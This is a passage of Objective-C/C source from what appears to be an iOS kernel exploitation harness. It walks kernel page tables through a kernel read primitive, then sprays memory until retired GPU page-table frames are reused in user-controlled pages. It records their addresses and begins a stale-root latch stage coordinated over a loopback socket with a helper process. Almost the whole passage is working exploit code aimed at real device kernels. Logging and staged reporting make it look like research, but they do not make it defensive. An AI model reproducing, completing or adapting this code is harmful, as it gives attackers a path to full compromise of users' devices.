                if (reasonOut != NULL) *reasonOut = "l3-leaf-predicate-failed";
                return false;
            }
            uint64_t frame = entry & CNDUatE2TTAddressMask &
                ~(CNDUatE1PageSize - 1);
            if (frame == 0 || (frame & (CNDUatE1PageSize - 1)) != 0) {
                if (reasonOut != NULL) *reasonOut = "l3-frame-invalid";
                return false;
            }
            translations[pageIndex + offset] = (CNDUatE2ReuseTranslation){
                .virtualAddress = base +
                    (pageIndex + offset) * CNDUatE1PageSize,
                .physicalFrame = frame,
                .leafEntry = entry,
            };
        }
        if (!CNDUatE1Read(api, leafAddress, stableEntries, leafBytes) ||
            memcmp(leafEntries, stableEntries, leafBytes) != 0) {
            if (reasonOut != NULL) *reasonOut = "l3-leaf-span-unstable";
            return false;
        }
        calls++;
        uint64_t l2Stable = 0;
        if (!CNDUatE1Read64(api, l2Address, &l2Stable) ||
            l2Stable != l2Entry) {
            if (reasonOut != NULL) *reasonOut = "l2-entry-unstable";
            return false;
        }
        calls++;
        pageIndex = groupEnd;
    }

    uint64_t stable = 0;
    uint64_t stablePointer = 0;
    if (!CNDUatE1Read64(api, l1Address, &stable) || stable != l1Entry ||
        !CNDUatE1Read64(api, walker->map + 0x40, &stable) ||
        !CNDUatE2CheckedKernelPointer(api, stable, &stablePointer) ||
        stablePointer != walker->pmap ||
        !CNDUatE1Read64(api, walker->pmap + 0x0, &stable) ||
        !CNDUatE2CheckedKernelPointer(api, stable, &stablePointer) ||
        stablePointer != walker->rootTable ||
        !CNDUatE1Read64(api, walker->pmap + 0x8, &stable) ||
        stable != walker->rootPhysical ||
        !CNDUatE1Read64(api, walker->pmap + 0x20, &stable) ||
        !CNDUatE2CheckedKernelPointer(api, stable, &stablePointer) ||
        stablePointer != walker->attributes) {
        if (reasonOut != NULL) *reasonOut = "pmap-changed-during-batch";
        return false;
    }
    calls += 5;
    if (checkedReadCallsOut != NULL) *checkedReadCallsOut = calls;
    return true;
}

static bool CNDUatE2ReserveReuseBatch(
    NSMutableDictionary<NSString *, id> *report,
    CNDUatE2ReuseReservation *reservation, NSString **reasonOut)
{
    if (reservation == NULL) return false;
    memset(reservation, 0, sizeof(*reservation));
    reservation->size =
        (mach_vm_size_t)CNDUatE2ReuseTotalPages * CNDUatE1PageSize;
    kern_return_t kr = mach_vm_allocate(
        mach_task_self(), &reservation->allocation, reservation->size,
        VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS || reservation->allocation == 0 ||
        (reservation->allocation & (CNDUatE1PageSize - 1)) != 0) {
        report[@"allocatorReuseReservation"] = @{
            @"allocateKR": [NSString stringWithFormat:@"0x%08x", kr],
            @"allocated": @NO,
        };
        if (reasonOut != NULL) *reasonOut = @"reuse-reservation-failed";
        return false;
    }
    reservation->allocated = true;
    reservation->candidateBase =
        reservation->allocation + CNDUatE1PageSize;
    volatile uint64_t *firstGuard =
        (volatile uint64_t *)(uintptr_t)reservation->allocation;
    volatile uint64_t *lastGuard = (volatile uint64_t *)(uintptr_t)(
        reservation->allocation +
        (CNDUatE2ReuseTotalPages - 1) * CNDUatE1PageSize);
    *firstGuard = UINT64_C(0xe200000000000001);
    *lastGuard = UINT64_C(0xe200000000000002);
    reservation->guardsFaulted =
        *firstGuard == UINT64_C(0xe200000000000001) &&
        *lastGuard == UINT64_C(0xe200000000000002);
    report[@"allocatorReuseReservation"] = @{
        @"allocated": @YES,
        @"allocateKR": @"0x00000000",
        @"allocationBase": CNDUatE1Hex(reservation->allocation),
        @"allocationBytes": @(reservation->size),
        @"totalPages": @(CNDUatE2ReuseTotalPages),
        @"guardPages": @(CNDUatE2ReuseGuardPages),
        @"candidateBase": CNDUatE1Hex(reservation->candidateBase),
        @"candidatePages": @(CNDUatE2ReuseCandidatePages),
        @"guardsFaultedBeforeRetirement": @(reservation->guardsFaulted),
        @"candidatePagesFaultedBeforeRetirement": @0,
    };
    CNDUatE1Persist(report);
    if (!reservation->guardsFaulted) {
        if (reasonOut != NULL) *reasonOut = @"reuse-guard-fault-failed";
        return false;
    }
    return true;
}

static bool CNDUatE2FaultAndVerifyCandidateRange(
    const CNDUatE2ReuseReservation *reservation,
    NSUInteger startPage, NSUInteger count)
{
    if (reservation == NULL || !reservation->allocated || count == 0 ||
        startPage > CNDUatE2ReuseCandidatePages ||
        count > CNDUatE2ReuseCandidatePages - startPage) {
        return false;
    }
    for (NSUInteger offset = 0; offset < count; offset++) {
        NSUInteger pageIndex = startPage + offset;
        volatile uint64_t *word = (volatile uint64_t *)(uintptr_t)(
            reservation->candidateBase + pageIndex * CNDUatE1PageSize);
        *word = UINT64_C(0xe2c5000000000000) | pageIndex;
    }
    __sync_synchronize();
    for (NSUInteger offset = 0; offset < count; offset++) {
        NSUInteger pageIndex = startPage + offset;
        volatile uint64_t *word = (volatile uint64_t *)(uintptr_t)(
            reservation->candidateBase + pageIndex * CNDUatE1PageSize);
        if (*word != (UINT64_C(0xe2c5000000000000) | pageIndex)) {
            return false;
        }
    }
    return true;
}

static bool CNDUatE2RunGuidedReuseSample(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    const CNDUatE2CheckedWalker *walker,
    const CNDUatE2ReuseReservation *reservation,
    CNDUatE2ReuseTranslation *translations,
    NSUInteger translationCapacity,
    uint64_t retiredRoot0, uint64_t retiredRoot1,
    const CNDUatE2FreeMaskOracle oracles[2],
    const CNDUatE3LivePath *livePath,
    const CNDUatE2FreeMaskOracle livePathOracles[2],
    CNDUatE3CapturedPlan *capturedPlanOut,
    bool *matchedOut, NSString **reasonOut)
{
    if (matchedOut != NULL) *matchedOut = false;
    if (capturedPlanOut != NULL) {
        memset(capturedPlanOut, 0, sizeof(*capturedPlanOut));
    }
    if (api == NULL || walker == NULL || reservation == NULL ||
        translations == NULL ||
        translationCapacity < CNDUatE2TranslationMaximumPages ||
        oracles == NULL || !reservation->allocated ||
        !reservation->guardsFaulted || retiredRoot0 == 0 ||
        retiredRoot1 == 0 ||
        (retiredRoot0 & (CNDUatE1PageSize - 1)) != 0 ||
        (retiredRoot1 & (CNDUatE1PageSize - 1)) != 0 ||
        oracles[0].rootPhysical != retiredRoot0 ||
        oracles[1].rootPhysical != retiredRoot1 ||
        oracles[0].wordAddress == 0 || oracles[1].wordAddress == 0 ||
        oracles[0].bitMask == 0 || oracles[1].bitMask == 0) {
        if (reasonOut != NULL) {
            *reasonOut = @"guided-reuse-sample-input-invalid";
        }
        return false;
    }
    bool targetAware = livePath != NULL && livePathOracles != NULL &&
        livePath->validated && livePath->rootIndex < 2 &&
        livePath->rootPhysical ==
            (livePath->rootIndex == 0 ? retiredRoot0 : retiredRoot1) &&
        livePathOracles[0].rootPhysical == livePath->directoryPhysical &&
        livePathOracles[1].rootPhysical == livePath->tablePhysical &&
        livePathOracles[0].wordAddress != 0 &&
        livePathOracles[1].wordAddress != 0 &&
        livePathOracles[0].bitMask != 0 &&
        livePathOracles[1].bitMask != 0 &&
        livePathOracles[0].afterBitSet &&
        livePathOracles[1].afterBitSet;
    if ((livePath != NULL || livePathOracles != NULL) && !targetAware) {
        if (reasonOut != NULL) {
            *reasonOut = @"guided-reuse-target-input-invalid";
        }
        return false;
    }
    bool requiredRootSet = targetAware
        ? oracles[livePath->rootIndex].afterBitSet
        : oracles[0].afterBitSet && oracles[1].afterBitSet;
    if (!requiredRootSet) {
        if (reasonOut != NULL) {
            *reasonOut = @"guided-reuse-required-root-not-free";
        }
        return false;
    }

    // This is the post-retirement critical window.  Keep all pressure,
    // exact-mask observations, tail faults, and translation in plain C
    // storage so Objective-C allocation cannot consume the target frames.
    CNDUatE2GuidedMaskPoll polls[CNDUatE2GuidedMaskPollCapacity] = {0};
    NSUInteger pollCount = 0;
    NSUInteger pressurePagesFaulted = 0;
    NSUInteger totalPagesFaulted = 0;
    NSUInteger transitionStartPage = NSUIntegerMax;
    NSUInteger captureCount = 0;
    NSUInteger maskCheckedReadCallUpperBound = 0;
    NSUInteger translationCheckedReadCalls = 0;
    uint64_t captureBase = 0;
    bool baselinePassed = false;
    bool transitionObserved = false;
    bool allNamedTargetsCleared = false;
    bool captureReady = false;
    bool pressureCompleted = false;
    bool translationPassed = false;
    bool walkerStableAfterTranslation = false;
    const char *failureReason = NULL;
    const char *translationReason = NULL;
    bool namedRootMatched = false;
    bool namedDirectoryMatched = false;
    bool namedTableMatched = false;
    uint64_t namedRootVirtual = 0;
    uint64_t namedDirectoryVirtual = 0;
    uint64_t namedTableVirtual = 0;
    NSUInteger namedRootCaptureIndex = NSUIntegerMax;
    NSUInteger namedDirectoryCaptureIndex = NSUIntegerMax;
    NSUInteger namedTableCaptureIndex = NSUIntegerMax;

    CNDUatE2GuidedMaskPoll *baseline = &polls[pollCount++];
    for (NSUInteger rootIndex = 0; rootIndex < 2; rootIndex++) {
        maskCheckedReadCallUpperBound += 2;
        baseline->stable[rootIndex] = CNDUatE2ReadStable64(
            api, oracles[rootIndex].wordAddress,
            &baseline->words[rootIndex]);
        baseline->bitSet[rootIndex] = baseline->stable[rootIndex] &&
            (baseline->words[rootIndex] & oracles[rootIndex].bitMask) != 0;
    }
    if (targetAware) {
        for (NSUInteger targetIndex = 0; targetIndex < 2; targetIndex++) {
            NSUInteger pollIndex = targetIndex + 2;
            maskCheckedReadCallUpperBound += 2;
            baseline->stable[pollIndex] = CNDUatE2ReadStable64(
                api, livePathOracles[targetIndex].wordAddress,
                &baseline->words[pollIndex]);
            baseline->bitSet[pollIndex] =
                baseline->stable[pollIndex] &&
                (baseline->words[pollIndex] &
                 livePathOracles[targetIndex].bitMask) != 0;
        }
    }
    if (!baseline->stable[0] || !baseline->stable[1] ||
        (targetAware &&
         (!baseline->stable[2] || !baseline->stable[3]))) {
        failureReason = "guided-reuse-baseline-mask-read-unstable";
    } else if ((targetAware &&
                (!baseline->bitSet[livePath->rootIndex] ||
                 !baseline->bitSet[2] || !baseline->bitSet[3])) ||
               (!targetAware &&
                (!baseline->bitSet[0] || !baseline->bitSet[1]))) {
        failureReason = "guided-reuse-target-bit-not-set-at-pressure-start";
    } else {
        baselinePassed = true;
    }

    for (NSUInteger chunk = 0;
         failureReason == NULL &&
             chunk < CNDUatE2GuidedPressurePolls;
         chunk++) {
        NSUInteger chunkStart =
            chunk * CNDUatE2GuidedPressureChunkPages;
        if (!CNDUatE2FaultAndVerifyCandidateRange(
                reservation, chunkStart,
                CNDUatE2GuidedPressureChunkPages)) {
            failureReason = "guided-reuse-pressure-fault-verify-failed";
            break;
        }
        pressurePagesFaulted += CNDUatE2GuidedPressureChunkPages;
        totalPagesFaulted = pressurePagesFaulted;

        CNDUatE2GuidedMaskPoll *poll = &polls[pollCount++];
        poll->pagesFaulted = pressurePagesFaulted;
        for (NSUInteger rootIndex = 0; rootIndex < 2; rootIndex++) {
            maskCheckedReadCallUpperBound += 2;
            poll->stable[rootIndex] = CNDUatE2ReadStable64(
                api, oracles[rootIndex].wordAddress,
                &poll->words[rootIndex]);
            poll->bitSet[rootIndex] = poll->stable[rootIndex] &&
                (poll->words[rootIndex] &
                 oracles[rootIndex].bitMask) != 0;
        }
        if (targetAware) {
            for (NSUInteger targetIndex = 0; targetIndex < 2;
                 targetIndex++) {
                NSUInteger pollIndex = targetIndex + 2;
                maskCheckedReadCallUpperBound += 2;
                poll->stable[pollIndex] = CNDUatE2ReadStable64(
                    api, livePathOracles[targetIndex].wordAddress,
                    &poll->words[pollIndex]);
                poll->bitSet[pollIndex] = poll->stable[pollIndex] &&
                    (poll->words[pollIndex] &
                     livePathOracles[targetIndex].bitMask) != 0;
            }
        }
        if (!poll->stable[0] || !poll->stable[1] ||
            (targetAware && (!poll->stable[2] || !poll->stable[3]))) {
            failureReason = "guided-reuse-pressure-mask-read-unstable";
            break;
        }
        if (targetAware) {
            bool namedRootBitSet = poll->bitSet[livePath->rootIndex];
            bool anyNamedTargetCleared = !namedRootBitSet ||
                !poll->bitSet[2] || !poll->bitSet[3];
            if (anyNamedTargetCleared &&
                transitionStartPage == NSUIntegerMax) {
                transitionStartPage = chunkStart;
            }
            transitionObserved = transitionObserved ||
                anyNamedTargetCleared;
            allNamedTargetsCleared = !namedRootBitSet &&
                !poll->bitSet[2] && !poll->bitSet[3];
            if (allNamedTargetsCleared) {
                captureReady = true;
                break;
            }
        } else if (!poll->bitSet[0] || !poll->bitSet[1]) {
            transitionObserved = true;
            captureReady = true;
            transitionStartPage = chunkStart;
            break;
        }
    }
    pressureCompleted = failureReason == NULL && !captureReady &&
        pressurePagesFaulted == CNDUatE2GuidedPressurePages;

    if (failureReason == NULL && captureReady) {
        if (!CNDUatE2FaultAndVerifyCandidateRange(
                reservation, pressurePagesFaulted,
                CNDUatE2GuidedMagazineTailPages)) {
            failureReason = "guided-reuse-tail-fault-verify-failed";
        } else {
            totalPagesFaulted += CNDUatE2GuidedMagazineTailPages;
            captureCount = targetAware
                ? pressurePagesFaulted - transitionStartPage +
                    CNDUatE2GuidedMagazineTailPages
                : CNDUatE2GuidedCapturePages;
            if (captureCount == 0 ||
                captureCount > CNDUatE2TranslationMaximumPages) {
                failureReason = "guided-reuse-capture-span-invalid";
            }
            captureBase = reservation->candidateBase +
                transitionStartPage * CNDUatE1PageSize;
            if (failureReason == NULL) {
                translationPassed = CNDUatE2TranslateContiguousPages(
                    api, walker, captureBase, captureCount, translations,
                    &translationCheckedReadCalls, &translationReason);
            }
            if (failureReason == NULL && !translationPassed) {
                failureReason = "guided-reuse-transition-translation-failed";
            } else if (translationPassed) {
                walkerStableAfterTranslation =
                    CNDUatE2WalkerAnchorsStable(api, walker);
                if (!walkerStableAfterTranslation) {
                    failureReason = "guided-reuse-walker-anchors-changed";
                }
            }
        }
    }

    bool uniqueFrames = true;
    bool matched = false;
    NSUInteger matchCount = 0;
    if (translationPassed && walkerStableAfterTranslation) {
        for (NSUInteger index = 0; index < captureCount; index++) {
            for (NSUInteger prior = 0; prior < index; prior++) {
                if (translations[prior].physicalFrame ==
                    translations[index].physicalFrame) {
                    uniqueFrames = false;
                }
            }
            bool rootMatch =
                translations[index].physicalFrame == retiredRoot0 ||
                translations[index].physicalFrame == retiredRoot1;
            if (rootMatch) matchCount++;
            if (targetAware) {
                if (translations[index].physicalFrame ==
                    livePath->rootPhysical) {
                    namedRootMatched = true;
                    namedRootVirtual = translations[index].virtualAddress;
                    namedRootCaptureIndex = index;
                }
                if (translations[index].physicalFrame ==
                    livePath->directoryPhysical) {
                    namedDirectoryMatched = true;
                    namedDirectoryVirtual =
                        translations[index].virtualAddress;
                    namedDirectoryCaptureIndex = index;
                }
                if (translations[index].physicalFrame ==
                    livePath->tablePhysical) {
                    namedTableMatched = true;
                    namedTableVirtual = translations[index].virtualAddress;
                    namedTableCaptureIndex = index;
                }
            }
        }
        matched = matchCount != 0;
        if (!uniqueFrames && failureReason == NULL) {
            failureReason = "guided-reuse-candidate-frames-not-unique";
        }
    }
    bool namedTargetPlanCaptured = targetAware && namedRootMatched &&
        namedDirectoryMatched && namedTableMatched;
    if (namedTargetPlanCaptured && capturedPlanOut != NULL) {
        *capturedPlanOut = (CNDUatE3CapturedPlan){
            .complete = true,
            .rootVirtual = namedRootVirtual,
            .directoryVirtual = namedDirectoryVirtual,
            .tableVirtual = namedTableVirtual,
            .rootPhysical = livePath->rootPhysical,
            .directoryPhysical = livePath->directoryPhysical,
            .tablePhysical = livePath->tablePhysical,
            .rootCaptureIndex = namedRootCaptureIndex,
            .directoryCaptureIndex = namedDirectoryCaptureIndex,
            .tableCaptureIndex = namedTableCaptureIndex,
        };
    }

    // The critical window has ended.  It is now safe to allocate report
    // objects from the captured plain-C evidence.
    report[@"allocatorReuseAttempted"] = @YES;
    report[@"allocatorReuseTargetRoot0"] = CNDUatE1Hex(retiredRoot0);
    report[@"allocatorReuseTargetRoot1"] = CNDUatE1Hex(retiredRoot1);
    report[@"allocatorReuseOrdering"] = @{
        @"retirementSnapshotBeforeCandidateFault": @YES,
        @"postRetirementRootBitsSetBeforePressure": @(baselinePassed),
        @"pressureChunkBeforeExactMaskPoll": @YES,
        @"firstClearStopsPressure": @(!targetAware),
        @"allNamedTargetClearsStopPressure": @(targetAware),
        @"boundedMagazineTailBeforeTranslation": @YES,
        @"candidateFaultBeforeObjectiveCReportAllocation": @YES,
        @"walkerPreparedBeforeRetirement": @YES,
    };
    NSMutableArray<NSDictionary<NSString *, id> *> *pollReport =
        [NSMutableArray arrayWithCapacity:pollCount];
    for (NSUInteger index = 0; index < pollCount; index++) {
        CNDUatE2GuidedMaskPoll poll = polls[index];
        [pollReport addObject:@{
            @"pollIndex": @(index),
            @"pagesFaulted": @(poll.pagesFaulted),
            @"root0Word": CNDUatE1Hex(poll.words[0]),
            @"root1Word": CNDUatE1Hex(poll.words[1]),
            @"root0Stable": @(poll.stable[0]),
            @"root1Stable": @(poll.stable[1]),
            @"root0BitSet": @(poll.bitSet[0]),
            @"root1BitSet": @(poll.bitSet[1]),
            @"directoryWord": CNDUatE1Hex(poll.words[2]),
            @"tableWord": CNDUatE1Hex(poll.words[3]),
            @"directoryStable": @(poll.stable[2]),
            @"tableStable": @(poll.stable[3]),
            @"directoryBitSet": @(poll.bitSet[2]),
            @"tableBitSet": @(poll.bitSet[3]),
        }];
    }
    NSMutableArray<NSDictionary<NSString *, id> *> *pageReport =
        [NSMutableArray arrayWithCapacity:captureCount];
    NSMutableArray<NSDictionary<NSString *, id> *> *matches =
        [NSMutableArray array];
    for (NSUInteger index = 0; index < captureCount; index++) {
        CNDUatE2ReuseTranslation translation = translations[index];
        bool root0Match = translation.physicalFrame == retiredRoot0;
        bool root1Match = translation.physicalFrame == retiredRoot1;
        NSDictionary *page = @{
            @"index": @(index),
            @"virtualAddress": CNDUatE1Hex(translation.virtualAddress),
            @"physicalFrame": CNDUatE1Hex(translation.physicalFrame),
            @"leafEntry": CNDUatE1Hex(translation.leafEntry),
            @"root0Match": @(root0Match),
            @"root1Match": @(root1Match),
        };
        [pageReport addObject:page];
        if (root0Match || root1Match) [matches addObject:page];
    }
    NSString *outcome = failureReason != NULL
        ? @"guided-sample-failed"
        : (namedTargetPlanCaptured
            ? @"named-root-directory-table-reuse-observed"
            : (matched
            ? @"same-frame-reuse-observed"
            : (captureReady
                ? @"guided-target-clears-no-same-frame"
                : (transitionObserved
                    ? @"guided-partial-named-target-clear"
                    : @"guided-pressure-no-named-target-clear"))));
    bool sampleValid = failureReason == NULL &&
        (pressureCompleted ||
         (captureReady && translationPassed &&
          walkerStableAfterTranslation && uniqueFrames));
    report[@"allocatorReuseSample"] = @{
        @"valid": @(sampleValid),
        @"bounded": @YES,
        @"staticAudit": @"e2_guided_reuse_audit.py",
        @"reservationCandidatePages": @(CNDUatE2ReuseCandidatePages),
        @"pressurePageLimit": @(CNDUatE2GuidedPressurePages),
        @"pressureChunkPages": @(CNDUatE2GuidedPressureChunkPages),
        @"magazineTailPages": @(CNDUatE2GuidedMagazineTailPages),
        @"capturePageLimit": @(CNDUatE2TranslationMaximumPages),
        @"pressurePagesFaulted": @(pressurePagesFaulted),
        @"candidatePagesFaulted": @(totalPagesFaulted),
        @"candidatePagesTranslated": @(captureCount),
        @"maskPollCountIncludingBaseline": @(pollCount),
        @"maskCheckedReadAPICallUpperBound":
            @(maskCheckedReadCallUpperBound),
        @"translationCheckedReadAPICalls":
            @(translationCheckedReadCalls +
              (walkerStableAfterTranslation ? 7 : 0)),
        @"checkedReadAPICallUpperBound":
            @(maskCheckedReadCallUpperBound +
              translationCheckedReadCalls +
              (walkerStableAfterTranslation ? 7 : 0)),
        @"baselineRootBitsSet": @(baselinePassed),
        @"namedTargetAware": @(targetAware),
        @"allNamedTargetsCleared": @(allNamedTargetsCleared),
        @"captureReady": @(captureReady),
        @"transitionObserved": @(transitionObserved),
        @"transitionStartPage": transitionStartPage != NSUIntegerMax
            ? @(transitionStartPage) : (id)[NSNull null],
        @"captureBase": CNDUatE1Hex(captureBase),
        @"pressureCompletedWithoutTransition": @(pressureCompleted),
        @"maskPolls": pollReport,
        @"framesUnique": @(uniqueFrames),
        @"walkerStableAfterTranslation": @(walkerStableAfterTranslation),
        @"targetRoot0": CNDUatE1Hex(retiredRoot0),
        @"targetRoot1": CNDUatE1Hex(retiredRoot1),
        @"namedRootPhysical": targetAware
            ? CNDUatE1Hex(livePath->rootPhysical) : @"0x0",
        @"namedDirectoryPhysical": targetAware
            ? CNDUatE1Hex(livePath->directoryPhysical) : @"0x0",
        @"namedTablePhysical": targetAware
            ? CNDUatE1Hex(livePath->tablePhysical) : @"0x0",
        @"namedRootMatched": @(namedRootMatched),
        @"namedDirectoryMatched": @(namedDirectoryMatched),
        @"namedTableMatched": @(namedTableMatched),
        @"namedTargetPlanCaptured": @(namedTargetPlanCaptured),
        @"matchCount": @(matches.count),
        @"matched": @(matched),
        @"outcome": outcome,
        @"failureReason": failureReason != NULL
            ? [NSString stringWithUTF8String:failureReason] : @"none",
        @"translationFailureReason": translationReason != NULL
            ? [NSString stringWithUTF8String:translationReason] : @"none",
        @"pages": pageReport,
        @"matches": matches,
        @"kernelWrites": @0,
        @"retiredRootDereferenced": @NO,
        @"vmPageScanUsed": @NO,
    };
    report[@"allocatorReuseMatched"] = @(matched);
    CNDUatE1Persist(report);
    log_user("[UAT_E2] guided-reuse pressure=%lu total-faulted=%lu "
             "transition=%s start=%s translated=%lu matches=%lu "
             "namedPlan=%s root0=0x%016llx root1=0x%016llx outcome=%s\n",
             (unsigned long)pressurePagesFaulted,
             (unsigned long)totalPagesFaulted,
             transitionObserved ? "yes" : "no",
             transitionObserved
                ? [[@(transitionStartPage) description] UTF8String] : "-",
             (unsigned long)captureCount,
             (unsigned long)matches.count,
             namedTargetPlanCaptured ? "yes" : "no",
             (unsigned long long)retiredRoot0,
             (unsigned long long)retiredRoot1,
             [outcome UTF8String]);
    if (matchedOut != NULL) *matchedOut = matched;
    if (!sampleValid && reasonOut != NULL) {
        *reasonOut = failureReason != NULL
            ? [NSString stringWithUTF8String:failureReason]
            : @"guided-reuse-sample-invalid";
    }
    return sampleValid;
}

static NSDictionary<NSString *, id> *CNDUatE2ExactOpenTransition(
    NSArray<NSDictionary<NSString *, id> *> *changes)
{
    if (changes.count != 1) return nil;
    NSDictionary<NSString *, id> *change = changes.firstObject;
    if (![change[@"becameValid"] boolValue] ||
        [change[@"becameInvalid"] boolValue]) return nil;
    return change;
}

static bool CNDUatE2ExactCloseTransition(
    NSArray<NSDictionary<NSString *, id> *> *changes,
    NSNumber *expectedIndex)
{
    if (changes.count != 1 || expectedIndex == nil) return false;
    NSDictionary<NSString *, id> *change = changes.firstObject;
    return [change[@"index"] isEqual:expectedIndex] &&
        [change[@"becameInvalid"] boolValue] &&
        ![change[@"becameValid"] boolValue];
}

static bool CNDUatE2ExactCloseTransitionRaw(
    const CNDUatE1TTBATSnapshot *before,
    const CNDUatE1TTBATSnapshot *after,
    NSUInteger expectedIndex, NSUInteger *changedCountOut)
{
    if (changedCountOut != NULL) *changedCountOut = 0;
    if (before == NULL || after == NULL ||
        expectedIndex >= CNDUatE1TTBATEntries) {
        return false;
    }
    NSUInteger changed = 0;
    bool expectedCleared = false;
    for (NSUInteger index = 0; index < CNDUatE1TTBATEntries; index++) {
        uint64_t before0 = before->words[index * 2];
        uint64_t before1 = before->words[index * 2 + 1];
        uint64_t after0 = after->words[index * 2];
        uint64_t after1 = after->words[index * 2 + 1];
        if (before0 == after0 && before1 == after1) continue;
        changed++;
        bool validBefore = (before0 & 1) != 0 || (before1 & 1) != 0;
        bool validAfter = (after0 & 1) != 0 || (after1 & 1) != 0;
        if (index == expectedIndex && validBefore && !validAfter) {
            expectedCleared = true;
        }
    }
    if (changedCountOut != NULL) *changedCountOut = changed;
    return changed == 1 && expectedCleared;
}

static bool CNDUatE3RunStaleRootLatch(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    const CNDUatE2CheckedWalker *walker, uint64_t ttbat,
    const CNDUatE1TTBATSnapshot *retiredSnapshot,
    NSUInteger expectedContextID, NSUInteger expectedRootIndex,
    const CNDUatE3CapturedPlan *capturedPlan,
    const CNDUatE2FreeMaskOracle *capturedRootOracle,
    const CNDUatE2FreeMaskOracle capturedLowerOracles[2],
    bool *staleObservedOut, NSString **reasonOut)
{
    if (staleObservedOut != NULL) *staleObservedOut = false;
    if (reasonOut != NULL) *reasonOut = nil;
    if (report == nil || api == NULL || walker == NULL || ttbat == 0 ||
        retiredSnapshot == NULL || expectedContextID >= CNDUatE1TTBATEntries ||
        expectedRootIndex >= 2 || capturedPlan == NULL ||
        !capturedPlan->complete || capturedRootOracle == NULL ||
        capturedLowerOracles == NULL ||
        capturedRootOracle->rootPhysical != capturedPlan->rootPhysical ||
        capturedLowerOracles[0].rootPhysical != capturedPlan->directoryPhysical ||
        capturedLowerOracles[1].rootPhysical != capturedPlan->tablePhysical) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-input-invalid";
        return false;
    }

    CNDUatE2ExternalRendezvous rendezvous = {
        .listenFD = -1, .peerFD = -1, .port = 0,
    };
    CNDUatE2ExternalMessage ready = {0};
    CNDUatE2ExternalMessage completed = {0};
    CNDUatE2ExternalMessage exiting = {0};
    CNDUatE1TTBATSnapshot whileLatch = {0};
    CNDUatE3LivePath primaryPath = {0};
    CNDUatE3LivePath secondaryPath = {0};
    CNDUatE2ReuseTranslation ownedTranslations[3] = {0};
    const uint64_t ownedVirtuals[3] = {
        capturedPlan->rootVirtual,
        capturedPlan->directoryVirtual,
        capturedPlan->tableVirtual,
    };
    const uint64_t ownedPhysical[3] = {
        capturedPlan->rootPhysical,
        capturedPlan->directoryPhysical,
        capturedPlan->tablePhysical,
    };
    const CNDUatE2FreeMaskOracle ownershipOracles[3] = {
        *capturedRootOracle,
        capturedLowerOracles[0],
        capturedLowerOracles[1],
    };
    uint64_t ownershipMaskWords[3] = {0};
    NSUInteger ownershipTranslationReadCalls = 0;
    int rendezvousError = 0;
    int processGoneErrno = 0;
    NSUInteger processGoneAttempts = 0;
    bool opened = false;
    bool accepted = false;
    bool readyPassed = false;
    bool snapshotPassed = false;
    bool sameContextPassed = false;
    bool primaryPathPassed = false;
    bool secondaryPathPassed = false;
    bool pathPairPassed = false;
    bool ownershipTranslationsPassed = true;
    bool ownershipMasksClear = true;
    bool programmed = false;
    bool submitSent = false;
    bool completedPassed = false;
    bool freshObserved = false;
    bool staleObserved = false;
    bool releaseSent = false;
    bool exitingPassed = false;
    bool peerEOF = false;
    bool processGone = false;
    NSArray *openChanges = nil;
    NSDictionary *openTransition = nil;
    NSDictionary *whileSummary = nil;
    const char *primaryPathReason = NULL;
    const char *secondaryPathReason = NULL;

    opened = CNDUatE2OpenExternalRendezvous(&rendezvous, &rendezvousError);
    NSString *tokenHex = CNDUatE2TokenHex(rendezvous.token);
    report[@"e3LatchRendezvous"] = @{
        @"opened": @(opened),
        @"error": @(rendezvousError),
        @"observerPID": @(getpid()),
        @"port": @(rendezvous.port),
        @"token": tokenHex,
        @"address": @"127.0.0.1",
        @"loopbackOnly": @YES,
        @"mode": @"latch",
        @"requiredRootIndex": @(expectedRootIndex),
        @"protocolVersion": @(CNDUatE2ExternalMessageVersion),
    };
    CNDUatE1Persist(report);
    if (!opened) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-rendezvous-failed";
        goto done;
    }
    log_user("[UAT_E3] latch-helper-ready observerPid=%d port=%u "
             "token=%s bundle=com.zeroxjf.cyanide.e2metal mode=latch "
             "rootIndex=%lu\n", getpid(), rendezvous.port,
             tokenHex.UTF8String, (unsigned long)expectedRootIndex);

    accepted = CNDUatE2AcceptExternalHelper(&rendezvous, &rendezvousError);
    readyPassed = accepted && CNDUatE2ReadExternalMessage(
        rendezvous.peerFD, rendezvous.token,
        CNDUatE2ExternalMessageReady, &ready);
    readyPassed = readyPassed && ready.result == 0 &&
        ready.fillVerified == 1 && ready.mode == CNDUatE2ExternalModeLatch &&
        ready.gpuAddress != 0 && ready.secondaryGPUAddress != 0 &&
        ready.gpuAddress != ready.secondaryGPUAddress &&
        (ready.gpuAddress & (CNDUatE1PageSize - 1)) == 0 &&
        (ready.secondaryGPUAddress & (CNDUatE1PageSize - 1)) == 0 &&
        ((ready.gpuAddress >> 42) & 1) == expectedRootIndex &&
        ((ready.secondaryGPUAddress >> 42) & 1) == expectedRootIndex &&
        ready.primaryPatternBytes == 0 && ready.secondaryPatternBytes == 0;
    report[@"e3LatchHelperReady"] = @{
        @"accepted": @(accepted),
        @"passed": @(readyPassed),
        @"pid": @(ready.pid),
        @"result": @(ready.result),
        @"initialPatternsVerified": @(ready.fillVerified == 1),
        @"mode": @(ready.mode),
        @"primaryGPUAddress": CNDUatE1Hex(ready.gpuAddress),
        @"secondaryGPUAddress": CNDUatE1Hex(ready.secondaryGPUAddress),
        @"rootIndex": @((ready.gpuAddress >> 42) & 1),
    };
    CNDUatE1Persist(report);
    if (!readyPassed) {
        if (reasonOut != NULL) *reasonOut = @"e3-latch-helper-not-ready";
        goto done;
    }

    snapshotPassed = CNDUatE1SnapshotTTBAT(
        report, api, @"e3.latch.while-helper-alive", ttbat,
        &whileLatch, &whileSummary);
    if (snapshotPassed) {
        openChanges = CNDUatE1TTBATDiff(
            retiredSnapshot, &whileLatch, ttbat, @"latch-helper-open");
        openTransition = CNDUatE2ExactOpenTransition(openChanges);
        sameContextPassed = openTransition != nil &&
            [openTransition[@"index"] unsignedIntegerValue] ==
                expectedContextID;
    }
    uint64_t latchRoot0 = sameContextPassed
        ? whileLatch.words[expectedContextID * 2] & CNDUatE1TTBATPaddrMask : 0;
    uint64_t latchRoot1 = sameContextPassed
        ? whileLatch.words[expectedContextID * 2 + 1] & CNDUatE1TTBATPaddrMask : 0;
    report[@"e3LatchContextGate"] = @{
